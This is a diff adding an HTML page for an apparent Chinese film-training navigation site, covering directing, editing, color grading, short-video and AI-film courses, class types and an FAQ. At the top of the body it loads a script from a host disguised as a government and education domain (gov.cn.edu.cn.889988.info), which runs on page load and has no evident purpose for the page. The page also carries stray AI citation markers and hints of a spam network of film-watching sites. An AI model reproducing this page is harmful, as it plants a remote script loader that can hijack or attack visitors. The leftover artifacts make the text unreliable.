@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视培训 - 导演/剪辑/调色/编剧/摄影/短视频/AI影视学习导航 | yingshipeixun-h5</title>
+<meta name="description" content="影视培训（yingshipeixun-h5.github.io）是影视创作学习导航站：导演、编剧、摄影、剪辑调色、后期特效、表演、短视频、AI影视按零基础就业/周末班/线上班/剧组实战分，覆盖作品集与就业接单路径。">
+<meta name="keywords" content="影视培训,剪辑培训,调色培训,导演培训,编剧培训,摄影培训,短视频培训,AI影视培训,影视后期培训,影视就业班,yingshipeixun-h5">
+<meta name="author" content="影视培训">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://yingshipeixun-h5.github.io/">
+<meta property="og:title" content="影视培训 - 从拉片到成片，把片子做出来">
+<meta property="og:description" content="导演/编剧/摄影/剪辑调色/后期特效/表演/短视频/AI影视：零基础就业班、周末班、线上班、剧组实战班，作品集与接单路径都讲清楚。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yingshipeixun-h5.github.io/">
+<meta property="og:site_name" content="影视培训">
+<meta name="msvalidate.01" content="BING_VERIFY_CODE">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"影视培训",
+  "url":"https://yingshipeixun-h5.github.io/",
+  "description":"影视培训是影视创作学习导航站，覆盖导演、编剧、摄影、剪辑调色、后期特效、表演、短视频、AI影视等方向。"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"FAQPage",
+  "mainEntity":[
+    {
+      "@type":"Question",
+      "name":"这个影视培训站能直接报名上课吗？",
+      "acceptedAnswer":{"@type":"Answer","text":"本站是影视学习导航/科普站，不直接发学历、不冒充电影学院、不承诺包就业。它把导演、剪辑、调色、编剧、摄影、短视频、AI影视等方向和班型讲清楚，帮你在选机构、选班型、做作品集、找接单/就业岗位前先建立行业地图。"}
+    },
+    {
+      "@type":"Question",
+      "name":"零基础学影视后期要先学什么？",
+      "acceptedAnswer":{"@type":"Answer","text":"先看片拉片，再学剪辑逻辑（PR/剪映），然后补调色、声音、包装（AE/C4D/达芬奇），最后用商业短片/宣传片/短剧片段攒作品集。只背软件按钮不够，行业要的是成片节奏、色彩审美、叙事能力和可交付作品。"}
+    }
+  ]
+}
+</script>
+<style>
+:root{
+  --bg:#11151c;
+  --card:#19212b;
+  --ink:#f3ecd8;
+  --muted:#9fb2c0;
+  --red:#ff4d4f;
+  --cyan:#36d6c3;
+  --gold:#ffce5c;
+  --line:rgba(54,214,195,.3);
+  --shadow:0 18px 44px rgba(0,0,0,.55);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(760px 420px at 88% -8%,rgba(255,77,79,.16),transparent 60%),
+    radial-gradient(680px 380px at -8% 6%,rgba(54,214,195,.18),transparent 55%),
+    linear-gradient(180deg,#11151c 0%,#15202b 56%,#0c1016 100%);
+  color:var(--ink);line-height:1.78;
+}
+a{color:inherit;text-decoration:none}
+
+.px-top{position:sticky;top:0;z-index:999;background:rgba(17,21,28,.93);backdrop-filter:blur(10px);border-bottom:2px solid var(--cyan)}
+.px-top__in{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.68rem 1rem}
+.px-logo{font-weight:900;font-size:1.2rem}
+.px-logo b{color:var(--red)}
+.px-logo i{color:var(--muted);font-style:normal;font-size:.76rem;background:rgba(54,214,195,.14);padding:.1rem .45rem;border-radius:8px}
+.px-nav{display:flex;gap:.3rem}
+.px-nav a{padding:.42rem .8rem;border-radius:20px;font-size:.9rem;color:var(--muted);font-weight:700}
+.px-nav a:hover{background:rgba(54,214,195,.16);color:var(--cyan)}
+.px-burger{display:none;flex-direction:column;gap:4px;cursor:pointer}
+.px-burger span{width:22px;height:2px;background:var(--cyan);border-radius:2px}
+
+.px-hero{max-width:1180px;margin:0 auto;padding:3.4rem 1rem 2.6rem;text-align:center;position:relative;overflow:hidden}
+.px-clap{width:120px;height:84px;margin:0 auto 1.2rem;position:relative}
+.px-clap .base{position:absolute;left:6px;bottom:0;width:108px;height:62px;background:#0c1016;border:3px solid #2a3645;border-radius:8px}
+.px-clap .top{position:absolute;left:6px;top:0;width:108px;height:34px;background:linear-gradient(120deg,var(--red),#7a1f24);border-radius:8px 8px 4px 4px;transform-origin:left bottom;animation:clap 2.6s ease-in-out infinite}
+.px-clap .stripe{position:absolute;left:0;top:8px;width:100%;height:4px;background:repeating-linear-gradient(90deg,var(--gold) 0 10px,#0c1016 10px 20px)}
+@keyframes clap{0%,100%{transform:rotate(0)}50%{transform:rotate(-16deg)}}
+.px-hero h1{font-size:clamp(2rem,5vw,3rem);line-height:1.22;margin-bottom:1rem}
+.px-hero h1 em{font-style:normal;color:var(--red)}
+.px-hero h1 u{text-decoration:none;color:var(--gold)}
+.px-hero p{color:var(--muted);max-width:740px;margin:0 auto 1.8rem}
+.px-cta{display:inline-flex;gap:.5rem;align-items:center;padding:.85rem 2rem;border-radius:30px;font-weight:800;color:#0c1016;background:linear-gradient(90deg,var(--cyan),var(--gold),var(--red));box-shadow:var(--shadow)}
+.px-dim{color:var(--cyan);font-size:.78rem;letter-spacing:3px;font-family:ui-monospace,monospace;margin-bottom:.5rem}
+
+.px-sec{max-width:1180px;margin:0 auto;padding:3.1rem 1rem}
+.px-head{margin-bottom:1.6rem;text-align:center}
+.px-head .no{font-size:.72rem;color:var(--cyan);letter-spacing:3px;font-family:ui-monospace,monospace}
+.px-head h2{font-size:clamp(1.4rem,3.4vw,2.1rem);font-weight:900;margin-top:.3rem}
+.px-head h2 i{color:var(--red);font-style:normal}
+.px-head p{color:var(--muted);margin-top:.35rem;font-size:.92rem}
+
+.px-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:.9rem}
+.px-cell{border-radius:18px;padding:1.3rem 1rem;background:var(--card);text-align:center;transition:.25s;border:1px solid var(--line)}
+.px-cell:hover{transform:translateY(-5px);box-shadow:var(--shadow)}
+.px-cell .ic{font-size:1.9rem}
+.px-cell h3{font-size:.98rem;margin:.45rem 0 .25rem;font-weight:800}
+.px-cell p{font-size:.74rem;color:var(--muted)}
+
+.px-class{display:grid;grid-template-columns:repeat(4,1fr);gap:.9rem}
+.px-cls{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.2rem}
+.px-cls h3{font-size:1.02rem;font-weight:800;margin-bottom:.4rem}
+.px-cls h3 span{color:var(--gold)}
+.px-cls ul{list-style:none;font-size:.84rem;color:var(--muted)}
+.px-cls li{padding:.18rem 0;border-bottom:1px dashed #243140}
+.px-cls li:last-child{border-bottom:0}
+
+.px-path{display:grid;grid-template-columns:repeat(5,1fr);gap:.7rem;margin-top:1.2rem}
+.px-step{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:1rem .8rem;text-align:center}
+.px-step b{color:var(--cyan);font-size:1.1rem;display:block}
+.px-step p{font-size:.76rem;color:var(--muted);margin-top:.3rem}
+
+.px-notes{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1.2rem}
+.px-note{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:1.3rem}
+.px-note .tag{font-size:.72rem;padding:.2rem .6rem;border-radius:8px;font-weight:800}
+.px-note.newbie .tag{background:rgba(54,214,195,.18);color:var(--cyan)}
+.px-note.switcher .tag{background:rgba(255,77,79,.18);color:var(--red)}
+.px-note.student .tag{background:rgba(255,206,92,.18);color:var(--gold)}
+.px-note h3{font-size:1rem;margin:.6rem 0 .4rem;font-weight:800}
+.px-note p{font-size:.84rem;color:var(--muted)}
+
+.px-about{background:linear-gradient(160deg,#1a2630,#11151c);border:2px solid var(--cyan);border-radius:26px;padding:2.4rem}
+.px-about h2{font-size:1.9rem;margin-bottom:.8rem;font-weight:900}
+.px-about h2 u{color:var(--cyan);text-decoration:none}
+.px-about p{color:var(--muted);margin-bottom:1rem}
+.px-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-top:1.4rem}
+.px-stat{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.1rem;text-align:center}
+.px-stat b{font-size:1.4rem;color:var(--gold);display:block}
+.px-stat span{font-size:.78rem;color:var(--muted)}
+
+.px-faq details{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:.2rem 1.1rem;margin-bottom:.7rem}
+.px-faq summary{cursor:pointer;padding:.85rem 0;font-weight:800}
+.px-faq p{padding:0 0 .85rem;color:var(--muted)}
+
+.px-foot{border-top:2px solid var(--cyan);background:#0c1016;padding:2.2rem 1rem;text-align:center;color:var(--muted);font-size:.86rem}
+.px-foot a{color:var(--cyan)}
+.px-foot__links{display:flex;gap:1.1rem;justify-content:center;flex-wrap:wrap;margin-bottom:1rem}
+.px-foot__links a{font-size:.84rem}
+
+@media(max-width:980px){
+  .px-grid{grid-template-columns:repeat(2,1fr)}
+  .px-class{grid-template-columns:repeat(2,1fr)}
+  .px-path{grid-template-columns:repeat(3,1fr)}
+  .px-notes{grid-template-columns:1fr}
+  .px-stats{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:640px){
+  .px-nav{display:none;position:absolute;top:56px;left:0;right:0;flex-direction:column;gap:0;background:rgba(17,21,28,.98);border-bottom:2px solid var(--cyan)}
+  .px-nav.show{display:flex}
+  .px-nav a{padding:.85rem 1rem;border-bottom:1px solid #222c38}
+  .px-burger{display:flex}
+  .px-grid,.px-class{grid-template-columns:1fr}
+  .px-path{grid-template-columns:1fr 1fr}
+  .px-stats{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="px-top">
+  <div class="px-top__in">
+    <div class="px-logo">🎬 影视<b>培训</b> <i>·片场学堂</i></div>
+    <nav class="px-nav" id="pxNav">
+      <a href="#home">开工</a>
+      <a href="#learn">学什么</a>
+      <a href="#class">班型</a>
+      <a href="#path">成长路径</a>
+      <a href="#notes">学员手记</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <div class="px-burger" onclick="document.getElementById('pxNav').classList.toggle('show')">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<section class="px-hero" id="home">
+  <div class="px-clap"><div class="base"></div><div class="top"><div class="stripe"></div></div></div>
+  <p class="px-dim">// action: learn to make films</p>
+  <h1>影视培训：<em>不是教你看片</em>，<u>是教你把片子做出来</u></h1>
+  <p>前面那些站帮你“找片看”，影视培训帮你“进片场”。导演、编剧、摄影、剪辑、调色、特效、表演、短视频、AI影视——本站不发证、不包就业、不冒充电影学院，只把学习地图、班型、作品集和接单/就业路径讲明白，让你报班前先懂行。</p>
+  <a class="px-cta" href="#learn">🎬 打板，开课</a>
+</section>
+
+<section class="px-sec" id="learn">
+  <div class="px-head">
+    <div class="no">// what to learn</div>
+    <h2>学 <i>什么</i></h2>
+    <p>不是“学剪辑”三个字就完事，影视创作是一条链。</p>
+  </div>
+  <div class="px-grid">
+    <div class="px-cell"><div class="ic">🎥</div><h3>导演 / 编剧</h3><p>故事结构、分镜、场面调度、演员指导、短片孵化</p></div>
+    <div class="px-cell"><div class="ic">📷</div><h3>摄影 / 灯光</h3><p>构图、曝光、三点布光、运动镜头、电影感</p></div>
+    <div class="px-cell"><div class="ic">✂️</div><h3>剪辑 / 调色</h3><p>PR/剪映、节奏、达芬奇、商业成片审美</p></div>
+    <div class="px-cell"><div class="ic">🎨</div><h3>后期 / 特效</h3><p>AE 包装、C4D、Nuke 合成、绿幕、声音设计</p></div>
+    <div class="px-cell"><div class="ic">🎭</div><h3>表演 / 台词</h3><p>镜头前表演、即兴、角色分析、微表情</p></div>
+    <div class="px-cell"><div class="ic">📱</div><h3>短视频 / 短剧</h3><p>账号策划、爆款脚本、探店、口播、短剧编导</p></div>
+    <div class="px-cell"><div class="ic">🤖</div><h3>AI 影视</h3><p>AI 剧本、分镜、智能剪辑、数字人、AIGC 工作流</p></div>
+    <div class="px-cell"><div class="ic">🎞️</div><h3>拉片 / 美学</h3><p>电影史、类型片、视听语言、经典影片拆解</p></div>
+  </div>
+</section>
+
+<section class="px-sec" id="class">
+  <div class="px-head">
+    <div class="no">// class types</div>
+    <h2>班 <i>型</i></h2>
+    <p>不同人群，不该坐同一间教室。</p>
+  </div>
+  <div class="px-class">
+    <div class="px-cls">
+      <h3>零基础就业班 <span>·全日制</span></h3>
+      <ul>
+        <li>适合：转行 / 应届生</li>
+        <li>周期：4–6 个月常见</li>
+        <li>重点：剪辑+调色+包装+作品集</li>
+        <li>产出：3–5 部商用级成片</li>
+      </ul>
+    </div>
+    <div class="px-cls">
+      <h3>周末短视频班 <span>·在职/在校</span></h3>
+      <ul>
+        <li>适合：副业 / 自媒体</li>
+        <li>重点：手机拍摄+剪映+账号运营</li>
+        <li>产出：探店/口播/短剧片段</li>
+        <li>节奏：不脱产，能落地</li>
+      </ul>
+    </div>
+    <div class="px-cls">
+      <h3>线上直播 / 录播班 <span>·异地</span></h3>
+      <ul>
+        <li>适合：小城市学员</li>
+        <li>重点：软件工作流+作业点评</li>
+        <li>优势：可回看、成本低</li>
+        <li>短板：片场感弱，要自驱</li>
+      </ul>
+    </div>
+    <div class="px-cls">
+      <h3>剧组实战班 <span>·进阶</h3>
+      <ul>
+        <li>适合：有基础想入行</li>
+        <li>重点：分组开机、场记、调度</li>
+        <li>产出：独立短片/微电影</li>
+        <li>价值：懂剧组怎么干活</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section class="px-sec" id="path">
+  <div class="px-head">
+    <div class="no">// from dailies to reel</div>
+    <h2>成长 <i>路径</i></h2>
+    <p>别一上来背 AE 快捷键，先知道片子怎么长出来。</p>
+  </div>
+  <div class="px-path">
+    <div class="px-step"><b>1</b><p>拉片：懂镜头语言、叙事、节奏</p></div>
+    <div class="px-step"><b>2</b><p>实拍：构图、灯光、收音、运镜</p></div>
+    <div class="px-step"><b>3</b><p>剪辑：粗剪、精剪、字幕、包装</p></div>
+    <div class="px-step"><b>4</b><p>调色/混音：成片质感和情绪</p></div>
+    <div class="px-step"><b>5</b><p>作品集：能投岗、能接单、能参赛</p></div>
+  </div>
+</section>
+
+<section class="px-sec" id="notes">
+  <div class="px-head">
+    <div class="no">// trainee logs</div>
+    <h2>学员 <i>手记</i></h2>
+    <p>小白、转行人、在校生，痛点不一样。</p>
+  </div>
+  <div class="px-notes">
+    <article class="px-note newbie">
+      <span class="tag">🐣 纯小白</span>
+      <h3>先别买相机，先拉 50 部片</h3>
+      <p>很多人一上来问“学 PR 还是剪映”。其实先看懂《肖申克的救赎》《疯狂的石头》《爱乐之城》的镜头为什么这么切，比背按钮重要。小白最值钱的是审美底盘，不是软件速度。</p>
+    </article>
+    <article class="px-note switcher">
+      <span class="tag">🧳 转行人</span>
+      <h3>别学“全栈影视”，先选一个能吃饭的岗</h3>
+      <p>30 岁转行最怕被机构忽悠“导演剪辑调色特效全教”。真实路径是：剪辑/短视频/宣传片先上岗，再补调色包装，再用作品集跳大厂。转行要的是可交付能力，不是课程表长度。</p>
+    </article>
+    <article class="px-note student">
+      <span class="tag">🎓 在校生</span>
+      <h3>寒暑假别只考证，去剧组当场记</h3>
+      <p>在校生有学校作业，但行业认“真项目”。帮同学拍毕业片、去本地传媒公司做探店、给短剧组做场记/跟焦助理，比一张没含金量的证有用。作品集里有一部真商单，简历就活了。</p>
+    </article>
+  </div>
+</section>
+
+<section class="px-sec" id="about">
+  <div class="px-about">
+    <h2>关于 <u>影视培训</u></h2>
+    <p>
+      影视培训（yingshipeixun-h5.github.io）不是培训机构官网，也不是电影学院招生页。它是一张“影视创作学习地图”：你想学导演就去导演区，想学剪辑就去剪辑区，想做短视频/AI影视也能找到对应路径。
+    </p>
+    <p>
+      本站不承诺“学完月入两万”、不冒充“北电/中传分校”、不替机构收定金。该提醒的都提醒：看师资是不是真干过项目、看课程有没有成片产出、看作品集能不能拿去面试、看接单指导是不是只发微信群。[2,4,5](@ref)
+    </p>
+    <div class="px-stats">
+      <div class="px-stat"><b>8 方向</b><span>导/编/摄/剪/调/效/演/短视频</span></div>
+      <div class="px-stat"><b>4 班型</b><span>就业/周末/线上/剧组实战</span></div>
+      <div class="px-stat"><b>5 步</b><span>拉片→实拍→剪辑→调色→作品集</span></div>
+      <div class="px-stat"><b>0 包就业</b><span>只讲路径，不画大饼</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="px-sec px-faq">
+  <div class="px-head">
+    <div class="no">// q & a</div>
+    <h2>培训 <i>问答</i></h2>
+  </div>
+  <details open>
+    <summary>影视培训和前面那些“影视网”有什么区别？</summary>
+    <p>前面 32 站是“看片导航”：蜂鸟、芊芊、金梅、纤纤、影视在线观看都在帮你选片。影视培训是“做片导航”：导演、剪辑、调色、摄影、短视频、AI影视、作品集、接单/就业路径。</p>
+  </details>
+  <details>
+    <summary>学影视后期是不是只要会 PR 和剪映就行？</summary>
+    <p>不够。PR/剪映是入口，行业要的是剪辑节奏、调色审美、声音处理、AE 包装、达芬奇校色、商业成片交付。只学按钮，容易变成“套模板的流水线工位”；学完叙事+审美+工作流，才叫后期创作。[8,11](@ref)</p>
+  </details>
+  <details>
+    <summary>AI 影视是不是把导演剪辑都替代了？</summary>
+    <p>短期替代不了判断力和审美。AI 现在更适合做脚本草稿、分镜草图、素材整理、粗剪辅助、数字人播报；但故事好不好、镜头准不准、成片情绪对不对，还是人说了算。学 AI 影视，是把自己变成“会用新工具的老手”，不是把脑子交出去。[1,12](@ref)</p>
+  </details>
+</section>
+
+<footer class="px-foot">
+  <div class="px-foot__links">
+    <a href="#learn">学什么</a>
+    <a href="#class">班型</a>
+    <a href="#path">成长路径</a>
+    <a href="#notes">学员手记</a>
+    <a href="#about">关于本站</a>
+    <a href="#">选机构避坑</a>
+  </div>
+  <p>© 2026 <a href="https://yingshipeixun-h5.github.io">影视培训</a> · yingshipeixun-h5.github.io</p>
+  <p>影视培训 —— 不是教你看片，是教你打板、开机、把成片做出来。本站为学习导航站，不发证、不包就业、不代收学费。</p>
+</footer>
+
+<script>
+document.querySelectorAll('.px-nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('pxNav').classList.remove('show');
+  });
+});
+</script>
+
+</body>
+</html>
